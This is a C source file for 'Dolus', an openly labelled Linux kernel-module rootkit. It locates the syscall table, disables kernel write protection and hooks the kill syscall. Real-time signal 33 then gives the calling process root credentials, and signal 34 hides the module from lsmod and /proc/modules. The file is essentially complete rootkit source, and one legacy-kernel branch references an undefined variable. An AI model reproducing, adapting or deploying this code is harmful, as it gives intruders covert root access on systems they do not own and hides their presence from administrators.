/*
created by: kargisimos
*/

#include <linux/init.h>		//macros used to mark up functions e.g. __init, __exit
#include <linux/module.h>	//core header for loading LKMs into the kernel
#include <linux/kernel.h>	//contains types, macros, functions for the kernel e.g. KERN_INFO
#include <linux/kallsyms.h>	//contains functions e.g. kallsyms_lookup_name
#include <linux/version.h>	//linux kernel versions e.g. LINUX_VERSION_CODE, KERNEL_VERSION
#include <linux/unistd.h>   //contains syscall numbers e.g. __NR_kill
#include <asm/paravirt.h>   //contains function for read_cr0(), e.g. read control register 0
#include <linux/dirent.h>   // contains dirent structs etc
#include <linux/list.h>     //macros related to linked lists are defined here e.g. list_add(), list_del()
#include <linux/syscalls.h>

//uncomment next line to enable debugging
#define DEBUG 1
#ifdef DEBUG
#define DEBUG_INFO(...) do { \
    printk(KERN_INFO __VA_ARGS__); \
} while (0)
#else
#define DEBUG_INFO(...) do {} while (0)
#endif


MODULE_LICENSE("GPL");
MODULE_AUTHOR("kargisimos");
MODULE_DESCRIPTION("x86_64 linux LKM rootkit");
MODULE_VERSION("1.0");

static unsigned long *__sys_call_table;

//in linux kernels >= 5.7.0, kallsyms_lookup_name is not exported anymore
//workaround by using kprobes
//https://github.com/xcellerator/linux_kernel_hacking/issues/3
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
};
#endif

unsigned long *get_syscall_table(void)
{
    unsigned long *syscall_table;
    
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    if (!kallsyms_lookup_name) {
        DEBUG_INFO("[-]Dolus: Unable to get address of kallsyms_lookup_name\n");
        return NULL;
    }
#endif
    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    if (!syscall_table) {
        DEBUG_INFO("[-]Dolus: Unable to get address of sys_call_table\n");
        return NULL;
    }
    DEBUG_INFO("[+]Dolus: Address of kallsyms_lookup_name in kernel memory: 0x%px\n", kallsyms_lookup_name);
    DEBUG_INFO("[+]Dolus: Address of sys_call_table in kernel memory: 0x%px\n", syscall_table);
    return syscall_table;
}


//custom cr0 register to protect and unprotect from memory
//https://jm33.me/we-can-no-longer-easily-disable-cr0-wp-write-protection.html
static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    /* __asm__ __volatile__( */
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}


static  void unprotect_memory(void) {
    /* Bitwise AND (&) copies bit to result if it is in both operands
       Unary reverse (~) reverses the bits so ~0x10000 becomes 0x01111
    */
    write_cr0_forced(read_cr0() & (~0x10000));
    DEBUG_INFO("[+]Dolus: unprotected memory successfully\n");
}


static  void protect_memory(void) {
    /* Bitwise OR (|) copies bit to result if it is in either operands 
    */
    write_cr0_forced(read_cr0() | (0x10000));
    DEBUG_INFO("[+]Dolus: protected memory successfully\n");
}


/*
in linux kernels >= 4.17.0, a different calling convention for system calls
is used, where struct pt_regs in decoded on-the-fly in a syscall wrapper which
then hands processing over to the actual syscall function.
*/
#if CONFIG_X86_64
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
#define PTREGS_SYSCALL_STUB 1 
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill; //TODO: SAVE ALL SYSCALL FUNCTIONS IN AN ARRAY FOR EASIER CODE USE
#else 
typedef asmlinkage long(*orig_kill_t)(pid_t pid, int sig);
static orig_kill_t orig_kill;
#endif
#endif


static int store(void) {
// if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0), syscalls use pt_regs as arguments
#if PTREGS_SYSCALL_STUB
    // kill
    orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
    if (!orig_kill) {
        DEBUG_INFO("[-]Dolus: Unable to store orig_kill table entry\n");
        return 1;
    }
    else {
        DEBUG_INFO("[+]Dolus: orig_kill table entry successfully stored\n");
    }
// if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0), syscalls use direct arguments
#else
    // kill
    orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
    if (!orig_kill) {
        DEBUG_INFO("[-]Dolus: Unable to store orig_kill table entry\n");
        return 1;
    }
    else {
        DEBUG_INFO("[+]Dolus: orig_kill table entry successfully stored\n");
    }
#endif
    return 0;
}


/*
the linux kernel supports a range of 33 different, real-time
signals, numbered 32 to 64.
https://www.man7.org/linux/man-pages/man7/signal.7.html
*/
enum signals {
    SIGSUPER = 33, //become root
    SIGINVIS = 34, //hide Dolus from lsmod, /proc/modules, /proc/kallsyms, /sys/module
};

//https://github.com/torvalds/linux/blob/master/Documentation/security/credentials.rst#altering-credentials
void set_root(void) {
    struct cred *root;
    root = prepare_creds();
    if (root == NULL) {
        DEBUG_INFO("[-]Dolus: failed to prepare root creds\n");
        return;
    }
    //set the credentials to root
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}


//hide rootkit: 1->hidden, 0->unhidden
static short hidden = 0;
static struct list_head *prev_module;


//https://github.com/torvalds/linux/blob/master/include/linux/list.h
void hide_dolus(void) {
    //for lsmod, /proc/modules, /proc/kallsyms
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

    //for /sys/module TODO
    //kobject_del(&THIS_MODULE->mkobj.kobj);
}

void unhide_dolus(void) {
    list_add(&THIS_MODULE->list, prev_module);
}



#if PTREGS_SYSCALL_STUB
static asmlinkage long hack_kill(const struct pt_regs *regs) {
    void set_root(void);
    void unhide_dolus(void);
    void hide_dolus(void);

    int sig = regs->si;
    if (sig == SIGSUPER) {
        DEBUG_INFO("[+]Dolus: received SIGSUPER kill signal: %d\n", sig);
        DEBUG_INFO("[+]Dolus: giving root privileges\n");
        set_root();
        DEBUG_INFO("[+]Dolus: root privileges successfully granted\n");
        return 0;
    }
    else if ((sig == SIGINVIS) && (hidden == 0)) {
        DEBUG_INFO("[+]Dolus: received SIGINVIS kill signal: %d\n", sig);
        DEBUG_INFO("[+]Dolus: hiding Dolus\n");
        hide_dolus();
        hidden = 1;
        DEBUG_INFO("[+]Dolus: successfully hide Dolus\n");
        return 0;
    }
    else if ((sig == SIGINVIS) && (hidden == 1)) {
        DEBUG_INFO("[+]Dolus: received SIGINVIS kill signal: %d\n", sig);
        DEBUG_INFO("[+]Dolus: unhiding Dolus\n");
        unhide_dolus();
        hidden = 0;
        DEBUG_INFO("[+]Dolus: successfully unhide Dolus\n");
        return 0;
    }

    //if received kill signal is not SIGSUPER, return original syscall
    return orig_kill(regs);
}

#else
static asmlinkage long hack_kill(pid_t pid, int sig) {
    void set_root(void);

    if (sig == SIGSUPER) {
        DEBUG_INFO("[+]Dolus: received SIGSUPER kill signal: %d\n", sig);
        DEBUG_INFO("[+]Dolus: giving root privileges\n");
        set_root();
        DEBUG_INFO("[+]Dolus: root privileges successfully granted\n");
        return 0;
    }
    else if ((sig == SIGINVIS) && (hidden == 0)) {
        DEBUG_INFO("[+]Dolus: received SIGINVIS kill signal: %d\n", sig);
        DEBUG_INFO("[+]Dolus: hiding Dolus\n");
        hide_dolus();
        hidden = 1;
        DEBUG_INFO("[+]Dolus: successfully hide Dolus\n");
        return 0;
    }
    else if ((sig == SIGINVIS) && (hidden == 1)) {
        DEBUG_INFO("[+]Dolus: received SIGINVIS kill signal: %d\n", sig);
        DEBUG_INFO("[+]Dolus: unhiding Dolus\n");
        unhide_dolus();
        hidden = 0;
        DEBUG_INFO("[+]Dolus: successfully unhide Dolus\n");
        return 0;
    }
    //if received kill signal is not SIGSUPER, return original syscall
    return orig_kill(regs);
}
#endif



static int hook(void) {
    // kill syscall
    __sys_call_table[__NR_kill] = (unsigned long)&hack_kill;
    return 0;
}


static int cleanup(void) {
    // kill 
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    return 0;
}



static int __init dolus_init(void) {
    int err = 1;

	DEBUG_INFO("[+]Dolus: loaded successfully\n");
    __sys_call_table = get_syscall_table();

    if (store() == err) {
        DEBUG_INFO("store error\n");
    }
    unprotect_memory();
    if (hook() == err) {
        DEBUG_INFO("hook error\n");
    }
    protect_memory();

	return 0;
}

static void __exit dolus_exit(void) {
    int err = 1;
	DEBUG_INFO("[+]Dolus: unloaded successfully\n");

    unprotect_memory();
    if (cleanup() == err) {
        DEBUG_INFO("cleanup error\n");
    }
    protect_memory();
}

module_init(dolus_init);
module_exit(dolus_exit);